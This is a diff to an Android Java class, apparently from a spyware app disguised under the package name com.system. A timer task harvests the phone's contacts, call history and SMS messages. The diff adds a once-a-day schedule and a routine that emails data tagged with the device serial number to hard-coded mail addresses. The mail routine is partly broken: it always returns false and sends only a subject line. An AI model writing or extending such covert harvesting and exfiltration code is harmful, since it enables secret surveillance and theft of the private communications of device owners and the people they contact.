@@ -2,6 +2,7 @@ package com.system;
 
 import java.io.DataOutputStream;
 import java.io.File;
+import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 import java.util.TimerTask;
@@ -45,7 +46,18 @@ public class GetInfoTask extends TimerTask
 	{
 		Log.d(LOGTAG, "start to collect infomation");
 		
-		String now = (new Date()).toString();
+		// Firstly we should make sure the time range (>24H)
+		Date lastDatetime = ConfigCtrl.getLastGetInfoTime(service.getApplicationContext());
+		Calendar now = Calendar.getInstance();
+		now.add(Calendar.DATE, -1);
+		Date now_minus_1_day = now.getTime();
+		if (lastDatetime != null && now_minus_1_day.before(lastDatetime)) 
+		{
+			Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
+			return;
+		}
+		
+		// If network connected, try to collect and send the information
 		if (SysUtils.isNetworkConnected(service.getApplicationContext()))
 		{
 			CollectContact(this.service);
@@ -53,6 +65,12 @@ public class GetInfoTask extends TimerTask
 			CollectPhoneCallHist(this.service);
 			SysUtils.ThreadSleep(100000, LOGTAG);
 			CollectSms(this.service);
+		
+			// Send mail
+			boolean result = sendMail();
+			
+			// Update the last date time
+			if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
 		}
 		
 	}
@@ -64,7 +82,7 @@ public class GetInfoTask extends TimerTask
 		for (int i = 0; i < list.size(); i++)
 		{
 			sb.append(list.get(i).toString());
-			sb.append("\r\n");
+			sb.append(SysUtils.NEWLINE);
 		}
 		
 		String fileName = FileCtrl.makeFileName(service.getApplicationContext(), 
@@ -116,5 +134,24 @@ public class GetInfoTask extends TimerTask
 		} catch (Exception e) {
 			Log.e(LOGTAG, e.getMessage());
 		}
+	}
+	
+	private boolean sendMail()
+	{
+		boolean ret = false;
+
+        try {   
+            GMailSender sender = new GMailSender();
+            String subject = Resources.getSystem().getString(R.string.mail_from) 
+            		 + DeviceProperty.getSerialNum() + " - " + (new String()).toString();
+            String body = subject;
+            sender.sendMail(subject, body,   
+                    "user@gmail.com",   
+                    "user@yahoo.com");   
+        } catch (Exception e) {   
+            Log.e("SendMail", e.getMessage(), e);   
+        }
+        
+		return ret;
 	}
 }
